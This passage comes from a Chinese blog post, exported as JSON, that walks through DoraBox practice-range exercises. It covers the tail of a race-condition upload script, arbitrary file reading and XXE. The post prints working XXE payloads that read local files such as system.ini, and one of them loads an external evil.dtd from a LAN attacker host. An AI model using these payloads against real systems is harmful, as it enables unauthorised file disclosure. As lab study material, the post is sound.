class=\"number\">50</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads):</span><br><span class=\"line\">        t = RaceCondition()</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads):</span><br><span class=\"line\">        <span class=\"comment\"># join的原理就是依次检验线程池中的线程是否结束，没有结束就阻塞直到线程结束，如果结束则跳转执行下一个线程的join函数。</span></span><br><span class=\"line\">        t.join() </span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_jz_upload002.png\" alt=\"\"></p>\n<h2 id=\"总结-20\"><a class=\"markdownIt-Anchor\" href=\"#总结-20\">#</a> 总结：</h2>\n<p>python 的 self 竟然不是关键字？？？是因为__init__(self) 的时候创建了一个该类的实例，且名字叫 self，所以换成别的字符串，在别的函数里也能用把。</p>\n<p>python 类变量，它的值将在这个类的所有实例之间共享。（还有在_<em>init</em>_() 的时候 self. 变量，这和 java 区别还蛮大的）</p>\n<p>心得就是解题思路真的很重要，因为菜，都没见过，无从下手的感觉太难受了，是不是题目写多了就会有很多思路？希望不要写多了题目思维反而被局限了，还是要多思考。</p>\n<p>最后，这道题真的好帅啊！！！</p>\n<h1 id=\"任意文件读取\"><a class=\"markdownIt-Anchor\" href=\"#任意文件读取\">#</a> 任意文件读取</h1>\n<p>输入…/，发现是可以直接读文件的</p>\n<p><img src=\"dorabox_readanyfile002.png\" alt=\"\"></p>\n<h2 id=\"过程-21\"><a class=\"markdownIt-Anchor\" href=\"#过程-21\">#</a> 过程：</h2>\n<ol>\n<li>直接读取文件<img src=\"dorabox_readanyfile001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"总结-21\"><a class=\"markdownIt-Anchor\" href=\"#总结-21\">#</a> 总结：</h2>\n<p>这个，emmmm，这样的漏洞，很难找把？（傻喵）</p>\n<h1 id=\"xxe\"><a class=\"markdownIt-Anchor\" href=\"#xxe\">#</a> xxe</h1>\n<p>靶场 php 和 xml 交互的时候报错了，百度没找到解决方案，我太菜了（现在也很菜喔～我们回家摆小摊把 o (￣ε￣*)）</p>\n<p><img src=\"dorabox_xxe001.png\" alt=\"\"></p>\n<h2 id=\"过程-22\"><a class=\"markdownIt-Anchor\" href=\"#过程-22\">#</a> 过程：</h2>\n<ol>\n<li>\n<p>看前端代码，观察到服务端以 xml 的形式接收文件，然后服务器会正常返回客户端在 body 中 post 过去的 xml 代码执行结果</p>\n<p><img src=\"dorabox_xxe002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>构造 xml 文件读取 attack.php</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">Sakura</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY a <span class=\"meta-keyword\">SYSTEM</span>  <span class=\"meta-string\">&quot;file:///C:/Users/lenovo/Desktop/attack.php&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span><span class=\"symbol\">&amp;a;</span><span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>桜桜私はあなたを愛しています<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"总结-22\"><a class=\"markdownIt-Anchor\" href=\"#总结-22\">#</a> 总结：</h2>\n<p>xxe 就是外部实体注入嘛，可以一行代码禁用。</p>\n<p>xxe 是由 xml 和 dtd 约束搞出来的东西，我们可以通过文件路径和变量名，回显数据。</p>\n<p>1、 当引用的 DTD 文件是<strong>本地文件</strong>的时候，用 SYSTEM 标识，并写上”DTD 的文件路径”，如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>2、 如果引用的 DTD 文件是一个<strong>公共文件</strong>时，采用 PUBLIC 标识，如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE 根元素 PUBLIC &quot;DTD名称&quot; &quot;DTD文件的URL&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>1. 内部实体声明</strong></p>\n<!ENTITY 实体名称 \"实体的值\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;Thinking&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>2. 外部实体声明</strong></p>\n<!ENTITY 实体名称 SYSTEM \"URI/URL\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">copyright</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">test</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">reset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">login</span>&gt;</span><span class=\"symbol\">&amp;test;</span><span class=\"tag\">&lt;/<span class=\"name\">login</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">secret</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">secret</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>上述两种均为引用实体，主要在<strong> XML 文档中</strong>被应用，引用方式：<strong>&amp; 实体名称；</strong> 末尾要带上分号，这个引用将直接转变成实体内容。</p>\n<p><strong>3. 参数实体声明</strong></p>\n<!ENTITY % 实体名称 \"实体的值\"> \n<!ENTITY % 实体名称 SYSTEM \"URI/URL\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">copyright</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">body</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://www.runoob.com/entities.dtd&quot;</span> &gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;%body;&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">reset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">secret</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">secret</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>参数实体，被<strong> DTD 文件</strong>自身使用 ，引用方式为：% 实体名称。和通用实体一样，参数实体也可以外部引用。</p>\n<p>允许<strong>包含外部实体</strong>，就可能存在 XXE 攻击。</p>\n<p><strong>【利用 1】读取本地文件</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">creds</span> [  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">goodies</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">creds</span>&gt;</span><span class=\"symbol\">&amp;goodies;</span><span class=\"tag\">&lt;/<span class=\"name\">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>【利用 2】读取含特殊字符的本地文件</strong></p>\n<p>如果文件中含有特殊字符，如 &amp;,&lt;,&gt;,&quot;,' 等，通过上述方法会报错，需要借助 CDATA，CDATA 节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记。</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">roottag</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">start</span> <span class=\"meta-string\">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">goodies</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///C:/phpStudy/WWW/zhan/XXE-K/test.txt&quot;</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">end</span> <span class=\"meta-string\">&quot;]]&gt;&quot;</span>&gt;</span>  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">dtd</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://192.168.220.143:8888/zhan/XXE-K/evil.dtd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%dtd; ]&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">roottag</span>&gt;</span><span class=\"symbol\">&amp;all;</span><span class=\"tag\">&lt;/<span class=\"name\">roottag</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"最后哦\"><a class=\"markdownIt-Anchor\" href=\"#最后哦\">#</a> 最后哦</h1>\n<p>小心眼 + 记仇の milkii0，会打败你们的！</p>\n",
            "tags": [
                "dorabox,靶场练习"
            ]
        }
    ]
}